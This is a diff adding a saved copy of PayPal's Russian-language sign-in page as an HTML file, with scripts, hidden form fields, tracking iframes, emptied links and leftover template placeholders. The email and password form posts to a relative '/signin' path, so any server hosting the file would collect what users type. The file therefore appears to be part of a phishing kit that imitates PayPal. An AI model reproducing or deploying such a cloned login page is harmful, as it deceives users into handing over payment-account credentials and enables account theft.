@@ -1,0 +1,519 @@
+<html lang="ru" class=" desktop js "><!--<![endif]-->
+<head>
+	<!--Script info: script: node, template:  , date: Dec 24, 2018 12:39:32 -08:00, country: RU, language: ru web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLmNSWW7oQxSqkM7CaNNY3v81WEANLifsiG0LFfsDSAxs rlogid : ZVuXWyW8yyrrpGrWoTKH8juEf1W2M1E45q3VAYFIe0GZNnGJE00MssQHW92xKFuwc845F5tRp5LGPgRqVFTD2%2FtyjIiHGs4h_167e1f1b2ca -->
+	<meta charset="utf-8">
+	<title>Войдите в свой счет PayPal</title>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta name="application-name" content="PayPal">
+	<meta name="msapplication-task"
+	      content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
+	<meta name="msapplication-task"
+	      content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
+	<meta name="msapplication-task"
+	      content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
+	<meta name="keywords"
+	      content="transfer money, email money transfer, international money transfer ">
+	<meta name="description"
+	      content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
+	<link rel="shortcut icon"
+	      href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
+	<link rel="apple-touch-icon"
+	      href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
+	<link rel="canonical" href="https://www.paypal.com/ru/signin">
+	<meta name="viewport"
+	      content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
+	<meta property="og:image"
+	      content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
+	<link rel="stylesheet"
+	      href="https://www.paypalobjects.com/web/res/f1e/813b20f31d66d511f66ad332732bf/css/contextualLogin.css">
+	<!--[if lte IE 9]>
+	<link rel="stylesheet"
+	      href="https://www.paypalobjects.com/web/res/f1e/813b20f31d66d511f66ad332732bf/css/ie9.css"/>
+	<![endif]-->
+	<script nonce="">window.Modernizr = function (e, t, n) {
+      function r(e) {
+        d.cssText = e
+      }
+
+      function i(e, t) {
+        return r(prefixes.join(e + ";") + (t || ""))
+      }
+
+      function s(e, t) {
+        return typeof e === t
+      }
+
+      function o(e, t) {
+        return !!~("" + e).indexOf(t)
+      }
+
+      function u(e, t, r) {
+        for (var i in e) {
+          var o = t[e[i]];
+          if (o !== n) return r === !1 ? e[i] : s(o, "function") ? o.bind(r || t) : o
+        }
+        return !1
+      }
+
+      var a = "2.6.1", f = {}, l = !0, c = t.documentElement, h = "modernizr",
+        p = t.createElement(h), d = p.style, v, m = {}.toString, g = {}, y = {},
+        b = {}, w = [], E = w.slice, S, x = {}.hasOwnProperty, T;
+      !s(x, "undefined") && !s(x.call, "undefined") ? T = function (e, t) {
+        return x.call(e, t)
+      } : T = function (e, t) {
+        return t in e && s(e.constructor.prototype[t], "undefined")
+      }, Function.prototype.bind || (Function.prototype.bind = function (e) {
+        var t = this;
+        if (typeof t != "function") throw new TypeError;
+        var n = E.call(arguments, 1), r = function () {
+          if (this instanceof r) {
+            var i = function () {
+            };
+            i.prototype = t.prototype;
+            var s = new i, o = t.apply(s, n.concat(E.call(arguments)));
+            return Object(o) === o ? o : s
+          }
+          return t.apply(e, n.concat(E.call(arguments)))
+        };
+        return r
+      });
+      for (var N in g) T(g, N) && (S = N.toLowerCase(), f[S] = g[N](), w.push((f[S] ? "" : "no-") + S));
+      return f.addTest = function (e, t) {
+        if (typeof e == "object") for (var r in e) T(e, r) && f.addTest(r, e[r]); else {
+          e = e.toLowerCase();
+          if (f[e] !== n) return f;
+          t = typeof t == "function" ? t() : t, l && (c.className += " " + (t ? "" : "no-") + e), f[e] = t
+        }
+        return f
+      }, r(""), p = v = null, function (e, t) {
+        function n(e, t) {
+          var n = e.createElement("p"),
+            r = e.getElementsByTagName("head")[0] || e.documentElement;
+          return n.innerHTML = "x<style>" + t + "</style>", r.insertBefore(n.lastChild, r.firstChild)
+        }
+
+        function r() {
+          var e = g.elements;
+          return typeof e == "string" ? e.split(" ") : e
+        }
+
+        function i(e) {
+          var t = v[e[p]];
+          return t || (t = {}, d++, e[p] = d, v[d] = t), t
+        }
+
+        function s(e, n, r) {
+          n || (n = t);
+          if (m) return n.createElement(e);
+          r || (r = i(n));
+          var s;
+          return r.cache[e] ? s = r.cache[e].cloneNode() : c.test(e) ? s = (r.cache[e] = r.createElem(e)).cloneNode() : s = r.createElem(e), s.canHaveChildren && !l.test(e) ? r.frag.appendChild(s) : s
+        }
+
+        function o(e, n) {
+          e || (e = t);
+          if (m) return e.createDocumentFragment();
+          n = n || i(e);
+          var s = n.frag.cloneNode(), o = 0, u = r(), a = u.length;
+          for (; o < a; o++) s.createElement(u[o]);
+          return s
+        }
+
+        function u(e, t) {
+          t.cache || (t.cache = {}, t.createElem = e.createElement, t.createFrag = e.createDocumentFragment, t.frag = t.createFrag()), e.createElement = function (n) {
+            return g.shivMethods ? s(n, e, t) : t.createElem(n)
+          }, e.createDocumentFragment = Function("h,f", "return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&(" + r().join().replace(/\w+/g, function (e) {
+            return t.createElem(e), t.frag.createElement(e), 'c("' + e + '")'
+          }) + ");return n}")(g, t.frag)
+        }
+
+        function a(e) {
+          e || (e = t);
+          var r = i(e);
+          return g.shivCSS && !h && !r.hasCSS && (r.hasCSS = !!n(e, "article,aside,figcaption,figure,footer,header,hgroup,nav,section{display:block}mark{background:#FF0;color:#000}")), m || u(e, r), e
+        }
+
+        var f = e.html5 || {},
+          l = /^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,
+          c = /^<|^(?:a|b|button|code|div|fieldset|form|h1|h2|h3|h4|h5|h6|i|iframe|img|input|label|li|link|ol|option|p|param|q|script|select|span|strong|style|table|tbody|td|textarea|tfoot|th|thead|tr|ul)$/i,
+          h, p = "_html5shiv", d = 0, v = {}, m;
+        (function () {
+          try {
+            var e = t.createElement("a");
+            e.innerHTML = "<xyz></xyz>", h = "hidden" in e, m = e.childNodes.length == 1 || function () {
+              t.createElement("a");
+              var e = t.createDocumentFragment();
+              return typeof e.cloneNode == "undefined" || typeof e.createDocumentFragment == "undefined" || typeof e.createElement == "undefined"
+            }()
+          } catch (n) {
+            h = !0, m = !0
+          }
+        })();
+        var g = {
+          elements: f.elements || "abbr article aside audio bdi canvas data datalist details figcaption figure footer header hgroup mark meter nav output progress section summary time video",
+          shivCSS: f.shivCSS !== !1,
+          supportsUnknownElements: m,
+          shivMethods: f.shivMethods !== !1,
+          type: "default",
+          shivDocument: a,
+          createElement: s,
+          createDocumentFragment: o
+        };
+        e.html5 = g, a(t)
+      }(this, t), f._version = a, c.className = c.className.replace(/(^|\s)no-js(\s|$)/, "$1$2") + (l ? " js " + w.join(" ") : ""), f
+    }(this, this.document);        </script>
+	<script nonce="">/* Special integration eligibility check */
+    function isEligibleIntegration() {
+      var sxf = "";
+      return sxf === 'true' || window.name === 'PPFrameRedirect';
+    }
+
+    /* Don't bust the frame if this is top window */
+    if (self === top || isEligibleIntegration()) {
+      var antiClickjack = document.getElementById("antiClickjack");
+      if (antiClickjack) {
+        antiClickjack.parentNode.removeChild(antiClickjack);
+      }
+    } else {
+      top.location = self.location;
+    }</script>
+</head>
+<body class="desktop"
+      data-rlogid="ZVuXWyW8yyrrpGrWoTKH8juEf1W2M1E45q3VAYFIe0GZNnGJE00MssQHW92xKFuwc845F5tRp5LGPgRqVFTD2%2FtyjIiHGs4h_167e1f1b2ca"
+      data-hostname="rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLmNSWW7oQxSqkM7CaNNY3v81WEANLifsiG0LFfsDSAxs"
+      data-production="true" data-enable-ads-captcha="true"
+      data-ads-challenge-url="/auth/createchallenge/77bfe82fadd8ef47/challenge.js"
+      data-enable-client-cal-logging="true" data-correlation-id="c7b42cfac03fa"
+      data-show-hide-password="true" data-is-webkit-browser="true"
+      data-enable-fn-beacon-on-web-views="true" data-tealeaf-enable="true"
+      data-csrf-token="mFsHEKrJC8nA7H6EeH4fCyP2qR3+ugyNmteqU="
+      data-nonce="nQoXuy+H8mHrTrHn4RnyuPerfQZcZhJC9JfMGSBrTtWY9pkt"
+      data-tealeaf-url="https://www.paypalobjects.com/web/res/f1e/813b20f31d66d511f66ad332732bf/js/lib/tealeaf-ul-prod_domcap.min.js"
+      data-tpd-survey-enabled="true">
+<noscript><p class="nonjsAlert" role="alert">ПРИМЕЧАНИЕ. Для использования
+	возможностей веб-сайта PayPal необходимо включить поддержку Javascript и
+	файлов cookie. </p></noscript>
+<div id="main" class="main" role="main">
+	<section id="login" class="login " data-role="page"
+	         data-title="Войдите в свой счет PayPal">
+		<div class="corral">
+			<div id="content"
+			     class="contentContainer activeContent contentContainerBordered">
+				<header><p class="paypal-logo paypal-logo-long"></p></header>
+				<h1 class="headerText accessAid">Войдите в свой счет PayPal</h1>
+				<p id="phoneSubTagLine" class="subHeaderText hide hide">Вы уже
+					настроили ваш номер телефона для входа в систему? Введите
+					его ниже. Или нажмите на ссылку, чтобы войти с помощью
+					электронного адреса.</p>
+				<div class="notifications"></div>
+				<!-- temporary addition of notification which will just be displayed after clicking next in the phone page. This is for mobile ID login initial ramp and should be removed when we do public credential check -->
+				<form action="/signin?returnUri=https%3A%2F%2Fwww.paypal.com%2Fmyaccount&amp;state=%2F"
+				      method="post" class="proceed maskable" autocomplete="off"
+				      name="login" novalidate=""><input type="hidden" id="token"
+				                                        name="_csrf"
+				                                        value="mFsHEKrJC8nA7H6EeH4fCyP2qR3+ugyNmteqU="><input
+						type="hidden" name="locale.x" value="ru_RU"><input
+						type="hidden" name="processSignin" value="main"><input
+						type="hidden" name="fn_sync_data"
+						value="fn_sync_data"><input type="hidden" name="intent"
+				                                    value="signin"><input
+						type="hidden" name="ads-client-context"
+						value="signin"><input type="hidden" name="requestUrl"
+				                              value="/signin?returnUri=https%3A%2F%2Fwww.paypal.com%2Fmyaccount&amp;state=%2F"><input
+						type="hidden" name="forcePhonePasswordOptIn"
+						value=""><input type="hidden" name="returnUri"
+				                        value="https://www.paypal.com/myaccount"><input
+						type="hidden" name="state" value="/">
+					<div class="profileDisplayName hide"></div>
+					<div class="profileRememberedEmail hide "><span
+							class="profileDisplayPhoneCode"></span><span
+							class="profileDisplayEmail"></span><a href="#"
+					                                              class="notYouLink scTrack:not-you"
+					                                              id="backToInputEmailLink"
+					                                              pa-marked="1">Изменить</a>
+					</div>
+					<div id="splitEmail" class="splitEmail">
+						<div id="splitEmailSection">
+							<div id="emailSection" class="clearfix">
+								<div class="textInput  " id="login_emaildiv"
+								     style="z-index: 1;">
+									<div class="fieldWrapper "><label
+											for="email" class="fieldLabel">Электронный
+										адрес</label><input id="email"
+									                        name="login_email"
+									                        type="email"
+									                        class="hasHelp  validateEmpty   "
+									                        required="required"
+									                        value=""
+									                        autocomplete="off"
+									                        placeholder="Электронный адрес"
+									                        aria-describedby="emailErrorMessage">
+									</div>
+									<div class="errorMessage"
+									     id="emailErrorMessage"><p
+											class="emptyError hide">Обязательное
+										поле</p>
+										<p class="invalidError hide">Этот формат
+											электронного адреса неверный</p>
+									</div>
+								</div>
+							</div>
+							<div class="captcha captcha-container clearfix hide"
+							     id="splitEmailCaptcha">
+								<div class="captcha-image"><img src="" alt="">
+								</div>
+								<div class="captcha-inputs clearfix">
+									<div class="textInput  ">
+										<div class="fieldWrapper "><label
+												for="splitEmailCaptcha"
+												class="fieldLabel"></label><input
+												id="splitEmailCaptcha"
+												name="captchaCode" type="text"
+												class="hasHelp  validateEmpty   "
+												value="" autocomplete="off"
+												placeholder="Введите код"
+												aria-describedby="captchaErrorMessage">
+										</div>
+										<div class="errorMessage"
+										     id="captchaErrorMessage"><p
+												class="emptyError hide">
+											Обязательное поле</p></div>
+									</div>
+									<div class="refresh"><a href=""
+									                        class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink"
+									                        pa-marked="1"><span
+											class="accessAid">Перезагрузить изображение</span></a>
+									</div>
+									<div class="audio">
+										<audio id="captchaPlayer" src=""
+										       class="hide"></audio>
+										<a target="_blank" href=""
+										   class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink"
+										   pa-marked="1"><span
+												class="accessAid">Воспроизвести аудио</span></a>
+									</div>
+								</div>
+							</div>
+						</div>
+
+						<div class="tpdDemo hide" id="tpdDemo"><p
+								class="tpdDemoContent">Войдите в свою учетную
+							запись с помощью электронного адреса, а затем вам
+							потребуется выполнить вход с помощью биометрики в
+							вашем телефоне.</p></div>
+					</div>
+					<div id="splitPassword" class="splitPassword">
+						<div id="splitPasswordSection" class="">
+							<div id="passwordSection" class="clearfix">
+								<div class="textInput  " id="login_passworddiv"
+								     style="z-index: 1;">
+									<div class="fieldWrapper "><label
+											for="password" class="fieldLabel">Пароль</label><input
+											id="password" name="login_password"
+											type="password"
+											class="hasHelp  validateEmpty   pin-password"
+											required="required" value=""
+											placeholder="Пароль"
+											aria-describedby="passwordErrorMessage">
+										<div class="pwFpIcon hide"
+										     id="pwFpIcon"></div>
+									</div>
+									<div class="errorMessage"
+									     id="passwordErrorMessage"><p
+											class="emptyError hide">Обязательное
+										поле</p></div>
+								</div>
+							</div>
+						</div>
+						<div class="captcha captcha-container clearfix hide"
+						     id="splitPasswordCaptcha">
+							<div class="captcha-image"><img src="" alt=""></div>
+							<div class="captcha-inputs clearfix">
+								<div class="textInput  ">
+									<div class="fieldWrapper "><label
+											for="splitPasswordCaptcha"
+											class="fieldLabel"></label><input
+											id="splitPasswordCaptcha"
+											name="captcha" type="text"
+											class="hasHelp  validateEmpty   "
+											value="" autocomplete="off"
+											placeholder="Введите код"
+											aria-describedby="captchaErrorMessage">
+									</div>
+									<div class="errorMessage"
+									     id="captchaErrorMessage"><p
+											class="emptyError hide">Обязательное
+										поле</p></div>
+								</div>
+								<div class="refresh"><a href=""
+								                        class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink"
+								                        pa-marked="1"><span
+										class="accessAid">Перезагрузить изображение</span></a>
+								</div>
+								<div class="audio">
+									<audio id="captchaPlayer" src=""
+									       class="hide"></audio>
+									<a target="_blank" href=""
+									   class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink"
+									   pa-marked="1"><span class="accessAid">Воспроизвести аудио</span></a>
+								</div>
+							</div>
+						</div>
+						<div class="actions">
+							<button class="button actionContinue scTrack:unifiedlogin-login-submit"
+							        type="submit" id="btnLogin" name="btnLogin"
+							        value="Login" pa-marked="1">Войти
+							</button>
+						</div>
+					</div>
+					<input type="hidden" name="splitLoginContext"
+					       value="inputEmail"></form>
+				<div class="moreOptionsDiv  hide" id="moreOptionsContainer"><a
+						href="#" id="moreOptions" class="moreOptionsInfo"
+						pa-marked="1">Дополнительные функции</a>
+					<div class="bubble-tooltip hide" id="moreOptionsDropDown">
+						<ul class="moreoptionsGroup">
+							<li><a href="#" id="moreOptionsMobile"
+							       class="scTrack:unifiedlogin-click-more-options-mobile"
+							       pa-marked="1">Подтвердите вход в систему при
+								помощи мобильного</a></li>
+							<li>
+								<a href="/authflow/password-recovery/?country.x=RU&amp;locale.x=ru_RU&amp;redirectUri=%252Fsignin%253FreturnUri%253Dhttps%25253A%25252F%25252Fwww.paypal.com%25252Fmyaccount%2526state%253D%25252F"
+								   class="scTrack:unifiedlogin-click-forgot-password pwrLink"
+								   pa-marked="1">Не удается войти в счет?</a>
+							</li>
+						</ul>
+					</div>
+				</div>
+				<div class="forgotLink"><a
+						href=""
+						class="scTrack:unifiedlogin-click-forgot-password pwrLink"
+						pa-marked="1">Не удается войти в счет?</a></div>
+				<div class="pwr-modal forgotPasswordModal"
+				     id="password-recovery-modal">
+					<iframe id="pwdIframe"
+					        data-src=""
+					        scrolling="no" data-auto-reload="true"></iframe>
+					<div class="monogram-small"></div>
+				</div>
+				<div id="signupContainer" class="signupContainer"
+				     data-hide-on-email="" data-hide-on-pass="">
+					<div class="loginSignUpSeparator"><span
+							class="textInSeparator">или</span></div>
+					<a href="/ru/webapps/mpp/account-selection"
+					   class="button secondary scTrack:unifiedlogin-click-signup-button"
+					   id="createAccount" pa-marked="1">Открыть счет</a></div>
+				<div id="tpdButtonContainer" class="signupContainer hide">
+					<div class="loginSignUpSeparator"><span
+							class="textInSeparator">или</span></div>
+					<div class="actions">
+						<button class="button secondary" id="tpdButton"
+						        type="submit"
+						        value="Подтвердите вход в систему при помощи мобильного"
+						        pa-marked="1">Подтвердите вход в систему при
+							помощи мобильного
+						</button>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<section id="verification" class="verification hide" data-role="page"
+	         data-title="Подтверждение данных для входа в счет - PayPal">
+		<div class="corral">
+			<div class="contentContainer contentContainerLean">
+				<div id="pending" class="verificationSubSection"><h1
+						class="headerText">Откройте приложение PayPal</h1>
+					<p id="uncookiedMessage" class="verification-message hide">
+						Откройте приложение PayPal, нажмите «Да» в диалоговом
+						окне, а затем нажмите <span class="twoDigitPin">{twoDigitPin}</span>
+						на своем телефоне, чтобы войти в систему.</p>
+					<p id="cookiedMessage" class="verification-message hide">
+						Откройте приложение PayPal и нажмите «Да» в диалоговом
+						окне, чтобы войти в систему.</p>
+					<div class="notifications"></div>
+					<div class="accountArea"><span class="account"></span><span
+							class="verificationNotYou"><a data-href="#" href="#"
+					                                      class="scTrack:unifiedlogin-verification-click-notYou"
+					                                      id="pendingNotYouLink"
+					                                      pa-marked="1">Это не вы?</a></span>
+					</div>
+					<div class="mobileNotification"><p class="pin"></p>
+						<div class="mobileScreen"><img
+								src="https://www.paypalobjects.com/images/shared/icon-PN-check.png"
+								alt="phone"></div>
+					</div>
+					<p class="tryAnotherMsg"><a id="tryPasswordLink"
+					                            data-href="#" href=""
+					                            class="inlineLink showSurvey scTrack:try-password"
+					                            pa-marked="1">Попробуйте
+						использовать пароль</a></p>
+					<div class="passwordInstead">
+						<div class="bubble-tooltip hide"
+						     id="passwordInsteadDropDown">
+							<ul class="moreoptionsGroup"
+							    id="passwordInsteadGroup">
+								<li><a href="#" data-reason="passwordReason1"
+								       pa-marked="1">На данный момент у меня нет
+									этого телефона.</a></li>
+								<li><a href="#" data-reason="passwordReason2"
+								       pa-marked="1">Я не получал(а)
+									уведомление.</a></li>
+								<li><a href="#" data-reason="passwordReason4"
+								       pa-marked="1">Я опробую данную опцию
+									позже.</a></li>
+								<li><a href="#" data-reason="passwordReason5"
+								       pa-marked="1">Другое.</a></li>
+							</ul>
+						</div>
+					</div>
+					<p class="resendMsg"><a
+							class="inlineLink scTrack:resend hide" role="button"
+							data-href="#resend" href="" id="resend"
+							pa-marked="1">Отправить еще раз</a><span
+							class="sentMessage hide">Отправлено</span></p></div>
+				<div id="expired" class="hide verificationSubSection">
+					<header><p class="paypal-logo paypal-logo-long">PayPal</p>
+					</header>
+					<h1 class="headerText headerTextWarning">К сожалению, нам не
+						удалось подтвердить, что это вы</h1>
+					<p class="slimP">Нам не удалось подтвердить вашу личность,
+						так как мы не получили от вас ответа.</p>
+					<button id="expiredTryAgainButton"
+					        class="button actionsSpaced" pa-marked="1">Повторить
+						попытку
+					</button>
+				</div>
+				<div id="denied" class="denied hide verificationSubSection"><img
+						alt=""
+						src="https://www.paypalobjects.com/images/shared/glyph_alert_critical_big-2x.png"
+						class="deniedCaution">
+					<h1 class="headerText">К сожалению, нам не удалось
+						подтвердить, что это вы</h1>
+					<p>Нужна помощь? <a
+							href="/{coBrand}/cgi-bin/helpscr?cmd=_help"
+							class="inlineLink scTrack:help" pa-marked="1">Мы
+						можем помочь</a>.</p></div>
+			</div>
+		</div>
+	</section>
+</div>
+
+<div class="transitioning hide" aria-busy="false"><p class="checkingInfo hide">
+	Выполняется проверка вашей информации...</p>
+	<p class="oneSecond hide">Пожалуйста, подождите...</p>
+	<p class="secureMessage hide">Выполняется защищенный вход в систему...</p>
+	<p class="oneTouchMessage hide"></p>
+	<p class="retrieveInfo hide">Получаем информацию...</p>
+	<p class="waitFewSecs hide">Эта операция может занять несколько
+		секунд...</p></div>
+<iframe src="about:blank" title=""
+        style="width: 0px; height: 0px; border: 0px; position: absolute; z-index: -999;"></iframe>
+<iframe name="ppfniframe" id="ppfniframe"
+        style="width: 0; height: 0; border: 0; position:absolute; z-index:-999"
+        src="https://c.paypal.com/v1/r/d/i?js_src=https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js"></iframe>
+<img id="pfb3742"
+     src="https://c.paypal.com/v1/r/d/b/w?&amp;f=af9a77ba50a24c26a6b1bea2a20473a1&amp;s=UNIFIED_LOGIN_INPUT_EMAIL&amp;d=%7B%22rDT%22%3A%2215958%2C15792%2C15381%3A41579%2C41423%2C41000%3A26219%2C26080%2C25632%3A10861%2C10741%2C10263%3A10873%2C10769%2C10261%3A26247%2C26151%2C25624%3A26259%2C26177%2C25633%3A10898%2C10825%2C10264%3A26273%2C26209%2C25631%3A10909%2C10853%2C10263%3A21157%2C21106%2C20509%3A41650%2C41606%2C41000%3A26281%2C26242%2C25632%3A21157%2C21122%2C20509%3A41648%2C41617%2C41000%3A41646%2C41618%2C41001%3A26275%2C26250%2C25631%3A36519%2C36496%2C35880%3A26271%2C26250%2C25631%3A26269%2C26250%2C25631%3A18366%2C21%22%7D"
+     style="display: none;">
+</body>
+</html>
